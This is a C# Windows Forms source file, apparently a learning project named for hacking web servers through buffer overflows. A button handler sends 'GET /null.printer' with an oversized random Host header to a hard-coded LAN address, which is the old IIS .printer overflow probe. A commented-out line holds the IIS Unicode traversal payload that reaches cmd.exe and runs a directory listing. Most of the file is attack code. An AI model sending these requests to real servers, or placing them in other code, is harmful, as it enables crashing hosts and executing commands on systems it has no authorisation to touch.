using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;
using System.Net;
using System.Threading;

namespace hacking_Web_Servers_Exposed_Buffer_Overflow
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            ThreadPool.QueueUserWorkItem(new WaitCallback(run), null);

        }
        public void run(object state)
        {
            /*
            string buff = "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";
            buff += "welcome back this way to kl;sd zx vzodf osdproe lgs;gd;lg slgjs;l jgkl;sd ;lsg ;ldj g;lsd ;lsd gl;ksd g;d g gdsj goiretoeir t r s";

            MessageBox.Show(buff.Length.ToString());
            */
            TcpClient client = new TcpClient();
            IPEndPoint ep = (new IPEndPoint(IPAddress.Parse("192.168.2.5"), 80));
            //client.Connect("http://localhost/", 80);
            client.Connect(ep);
            //MessageBox.Show(client.Connected.ToString());
            NetworkStream ns = client.GetStream();
            StreamWriter sw = new StreamWriter(ns);
            byte[] hostData=new byte[420];
            new Random().NextBytes(hostData);
            sw.WriteLine("GET /null.printer HTTP/1.0");
            sw.WriteLine("Host: "+Encoding.Default.GetString(hostData).Replace('\r','f').Replace('\n','f'));

            //sw.WriteLine("GET /WebSite3/Default.aspx HTTP/1.1");
            //sw.WriteLine("GET /..%c0%af../windows/system32/cmd.exe?+/D+dir+'D:\' HTTP/1.0");
            //sw.WriteLine("Host: http://127.0.0.1:8080/");
            //sw.WriteLine("Connection: Close");
            //sw.WriteLine(@"image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-propel-config, */*");
            //sw.WriteLine("Accept-Encoding: compress, gzip");
            //sw.WriteLine("Accept-Encoding: compress, gzip");
            sw.WriteLine();
            sw.WriteLine();
            sw.Flush();
            //MessageBox.Show(client.Connected.ToString());
            StreamReader sr = new StreamReader(ns);
            //MessageBox.Show(client.Connected.ToString());
            //richTextBox1.Text = sr.ReadToEnd();
            string line = "";
            while ((line = sr.ReadLine()) != null)
            {
              //  MessageBox.Show(line);
                richTextBox1.Text += line+Environment.NewLine;
                line = "";
            }

            sr.Close();
            sw.Close();
        }
    }
}